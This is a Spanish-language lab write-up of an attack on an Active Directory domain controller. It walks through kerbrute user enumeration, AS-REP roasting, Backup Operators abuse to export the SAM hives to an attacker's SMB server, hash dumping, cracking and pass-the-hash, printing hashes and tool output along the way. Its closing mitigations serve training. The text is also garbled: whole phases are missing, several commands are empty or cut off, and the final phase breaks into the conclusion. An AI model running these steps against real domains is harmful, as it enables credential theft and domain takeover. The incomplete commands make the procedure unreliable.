# 🖥️ Máquina: dc02

> [!abstract] Ficha Técnica del Laboratorio
> **Sistema Operativo:** Windows — Active Directory  
> **Categoría:** Active Directory  
> **Técnicas trabajadas:** Kerbrute (enumeración de usuarios) · Fuerza bruta SMB (netexec) · AS-REP Roasting · ldapdomaindump · Backup Operators abuse · impacket-reg · impacket-secretsdump · Pass-the-Hash · evil-winrm  
> **Descripción:** En esta práctica atacaremos un controlador de dominio Windows con Active Directory. Enumeraremos usuarios del dominio con kerbrute sin credenciales, realizaremos fuerza bruta para obtener una primera contraseña, aplicaremos AS-REP Roasting para obtener el hash de otro usuario vulnerable, explotaremos los privilegios del grupo Backup Operators para extraer los archivos SAM del sistema, y finalmente usaremos el hash de la cuenta de máquina para hacer un DCSync completo y comprometer el Administrator.  
>

## 🔎 Fase 1: Enumeración de servicios

Empezamos revisando los puertos que tiene abiertos:

```bash
nmap -sT -p- 10.0.0.25 -Pn
```

```text
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
49677/tcp open  unknown
49726/tcp open  unknown
49783/tcp open  unknown
```

> [!info] Resultado
> El host presenta una serie de servicios muy característicos de un Controlador de Dominio (Domain Controller) de Active Directory en Windows:
> · 53/tcp (DNS) → indica que probablemente es servidor DNS interno del dominio.
> · 88/tcp (Kerberos-sec) → usado para autenticación Kerberos en Active Directory.
> · 389/tcp (LDAP) y 636/tcp (LDAPs) → permiten consultar y autenticar contra el directorio.
> · 3268/tcp y 3269/tcp (Global Catalog LDAP/SSL) → típicos en controladores de dominio con múltiples dominios/forests.
> · 445/tcp (SMB) → compartición de ficheros y posible vector de enumeración de usuarios/policies.
> · 5985/tcp (WSMan/WinRM) → administración remota vía PowerShell Remoting (si tienes credenciales válidas).
> · 9389/tcp (ADWS) → Active Directory Web Services, usado por aplicaciones para consultar/administrar objetos de AD mediante SOAP.
> · 135/139/593 y los puertos altos (496xx, 497xx) → RPC dinámicos usados por Windows para múltiples servicios (gestión remota, DCOM, WMI, etc).
> Conclusiones:
> · Es casi seguro un Domain Controller: la combinación de Kerberos, LDAP, DNS, SMB y Global Catalog es típica de un DC. La presencia de ADWS (9389) lo confirma aún más.
> Vectores iniciales de enumeración/explotación:
> · SMB (445) → intentar enumerar recursos compartidos, sesiones y usuarios.
> · LDAP (389/636) → enumerar información de dominio y cuentas si hay acceso anónimo.
> · Kerberos (88) → ataques como ASREPRoasting / Kerberoasting si tienes usuarios válidos.
> · WinRM (5985) → acceso remoto directo con credenciales válidas.

## 🌐 Fase 2: Identificación del dominio

Vamos a investigar el nombre del dominio. netexec smb sin credenciales nos devuelve información básica del host:

```bash
netexec smb 10.0.0.25
```

```text
SMB  10.0.0.25  445  DC01  [*] Windows Server 2022 Build 20348 x64
(name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
```

> [!info] Resultado
> El signing: True nos informa que no hay opción de enumerar información por SMB sin credenciales. SMB Signing obliga a firmar criptográficamente cada paquete SMB, lo que impide ataques de relay y limita la enumeración anónima. Confirmamos el dominio también con ldapsearch:

```bash
ldapsearch -x -LLL -H ldap://10.0.0.25 -s base -b
```

```text
rootDomainNamingContext: DC=SOUPEDECODE,DC=LOCAL
ldapServiceName: SOUPEDECODE.LOCAL:dc01$@SOUPEDECODE.LOCAL
```

Editamos nuestro archivo de hosts local de Kali para añadir el nombre del dominio y la IP:

```bash
sudo nano /etc/hosts
```

```text
10.0.0.25  SOUPEDECODE.LOCAL       DC01.SOUPEDECODE.LOCAL
```

> [!info] Resultado
> Guardamos con CTRL+O y salimos con CTRL+X. Confirmamos que sin credenciales no podemos listar shares:

```bash
smbclient -L 10.0.0.25
```

```text
session setup failed: NT_STATUS_ACCESS_DENIED
```

> [!info] Resultado
> No se listan shares, algo que el signing:True anterior ya nos adelantaba. Debido a esto vamos a intentar extraer usuarios del dominio usando kerbrute.

## 👤 Fase 3: Enumeración de usuarios con kerbrute

kerbrute es una herramienta que aprovecha el protocolo Kerberos para enumerar usuarios válidos del dominio sin necesidad de credenciales. Envía peticiones AS-REQ al puerto 88 por cada nombre de usuario del diccionario: si el usuario existe, el DC responde con un error específico (KRB5KDC_ERR_PREAUTH_REQUIRED); si no existe, responde con otro error diferente (KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN). Esta diferencia en la respuesta permite identificar usuarios válidos sin autenticarse ni generar eventos de bloqueo de cuenta.

Bajamos una versión precompilada para Linux desde: https://github.com/ropnop/kerbrute/releases/tag/v1.0.3

```bash
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
```

```bash
chmod +x kerbrute_linux_amd64
```

Y ahora usamos un diccionario de usuarios para comprobar si alguno pertenece al dominio:

```bash
./kerbrute_linux_amd64 userenum -d soupedecode.local --dc 10.0.0.25 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -o valid_users.txt
```

```text
2024/07/31 17:59:56 >  [+] VALID USERNAME: charlie@soupedecode.local
2024/07/31 17:59:57 >  [+] VALID USERNAME: Charlie@soupedecode.local
2024/07/31 17:59:57 >  [+] VALID USERNAME: administrator@soupedecode.local
2024/07/31 18:00:06 >  [+] VALID USERNAME: Administrator@soupedecode.local
2024/07/31 18:00:07 >  [+] VALID USERNAME: CHARLIE@soupedecode.local
```

> Obtenemos los usuarios válidos. Podemos parar con CTRL+C. Vamos a actuar sobre el usuario charlie en busca de una contraseña débil:

## 📋 Fase 5: Enumeración de usuarios del dominio

Vamos a enumerar ahora los usuarios del dominio. Podemos hacerlo de dos formas:

```bash
netexec smb 10.0.0.25 -u
```

En cualquier caso los vamos a guardar en un archivo usando enum4linux, que es una herramienta de enumeración de dominios Windows/Samba que extrae usuarios, grupos, shares y políticas:


Y limpiamos el contenido para quedarnos solo con los nombres de los usuarios:

```bash
cat users.txt | egrep 'Domain Users|Domain Controllers' | cut -d'\' -f2 | cut -d' ' -f1 > users_clean.txt
```

Comprobamos el fichero antes de usarlo:

```bash

```

## 🎫 Fase 6: AS-REP Roasting con impacket-GetNPUsers

GetNPUsers es una herramienta de Impacket que implementa AS-REP Roasting. Para cada usuario de la lista envía una petición Kerberos al controlador de dominio pidiendo un AS-REP (Authentication Service REPlY) sin proporcionar contraseña. Si la cuenta tiene activada la opción "Do not require Kerberos pre-authentication" (DONT_REQUIRE_PREAUTH), el DC responderá con un AS-REP que contiene datos cifrados con la clave derivada de la contraseña del usuario. Esos datos cifrados se pueden extraer y crackear offline para recuperar la contraseña.

La diferencia con Kerberoasting es que AS-REP Roasting no requiere ninguna autenticación previa: basta con tener una lista de usuarios válidos.

```bash
impacket-GetNPUsers SOUPEDECODE.LOCAL/ -dc-ip 10.0.0.25 -no-pass -usersfile users_clean.txt | grep krb5asrep
```

```text
$krb5asrep$23$zximena448@SOUPEDECODE.LOCAL:9b35c465f13e949fae29256180b5689d$a5873558038b0f1d885ef55cc18bc0484d73a236ea60e273b09311f8d2f09fe68ff688b90954033c791fedc638d80dd93f3402f6fe8249b3a462d5c83f46d7758aadfd888e311307e4a9c51bce8a49ec9b7c24c52a37a39fa1ad3555554c6a872d42e422b3ce8b65e055ad529c67c62afaaa3a17c3b5ac7a3a9924c8e64292dfea3236503e83805f7301d9a28ce2441ff962db3fec21611134655d718ec1a5b2418b54762800ce6af878f92c800d5493b42a6653a3f90dc0d8ea67d1dfcca22150248845e4b58b9c46563831e095a41271466887be3681249d2bfd2498f34ce5741674c9013a3ee7fb870f8b7ebf0e8c1b1089f04169
```

> [!info] Resultado
> Lo copiamos y lo pegamos en un archivo llamado zximena_hash:

## 💾 Fase 8: Extracción de SAM con impacket-reg (Backup Operators abuse)

Ahora vamos a aprovechar que el usuario es operador de backups para extraer del sistema el archivo SAM de credenciales de Windows. El archivo SAM (Security Account Manager) contiene los hashes NTLM de todas las cuentas locales del sistema. Junto con SYSTEM (que contiene la clave para desencriptarlos) y SECURITY (con credenciales en caché), forman el set completo para extraer hashes.

Necesitamos varios pasos para obtener todo lo necesario. Empezamos creando una carpeta compartida llamada info en Kali, donde recibiremos la información. impacket-smbserver levanta un servidor SMB temporal en Kali al que la víctima podrá enviar archivos:

```bash
impacket-smbserver info . -smb2support
```

En otro terminal de Kali lanzamos el siguiente comando. impacket-reg usa los privilegios de Backup Operators para exportar las ramas del registro que contienen los hashes directamente a nuestro servidor SMB:

```bash
impacket-reg
```

Comprobamos que hemos recibido los archivos SAM de credenciales de Windows:

```bash
ls
```

Y ahora vamos a dumpear los hashes con el siguiente impacket. impacket-secretsdump en modo LOCAL lee los archivos directamente sin necesidad de conectarse al DC:

```bash
impacket-secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL
```

> [!info] Resultado
> Obtenemos algunos hashes. Por ejemplo:

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
```

> [!info] Resultado
> Podemos crackearlo con hashcat. -m 1000 indica a hashcat que el formato es NTLM:

```bash
hashcat -m 1000 '209c6174da490caeb422f3fa5a7ae634' /usr/share/wordlists/rockyou.txt
```

> [!info] Resultado
> Sin embargo aunque obtenemos la clave, el equipo ha sido promovido a servidor de dominio y no funciona, o tendríamos que tener acceso local.
> Y hashes de cuentas de equipo en varios formatos:


## 🗄️ Fase 9: DCSync con la cuenta de máquina

Seguimos con este hash. Vamos a ver si con el hash NTLM encontrado algún usuario de nuestra lista inicia sesión:

> [!warning] Advertencia
> ⚠️ A partir de este punto comprueba el HASH que tienes, ya que puede variar entre ejecuciones.

```bash
netexec smb 10.0.0.25 -u users_clean.txt -H
```


> Obtenemos un usuario: DC01$. Tal y como sabemos debería ser una cuenta de equipo (las cuentas de equipo en Windows terminan con $). ## 📝 Conclusión general

> [!info] Resultado
> El laboratorio muestra un flujo clásico de penetración en un entorno Windows AD:
> Enumeración → Contraseñas débiles → Kerberos attacks → Privilege exploitation → Dumping de hashes → Escalada a Administrator.
> Destaca la importancia de mitigaciones:
> · No usar contraseñas débiles.
> · No dejar cuentas con DONT_REQ_PREAUTH activas sin necesidad.
> · Restringir privilegios de Backup Operators.
> · Mantener SMB Signing y otras políticas de seguridad.
> En resumen: el escenario demuestra cómo un atacante puede escalar desde un usuario con privilegios moderados hasta control total del DC, combinando técnicas Kerberos, Pass-the-Hash y explotación de privilegios de backup.
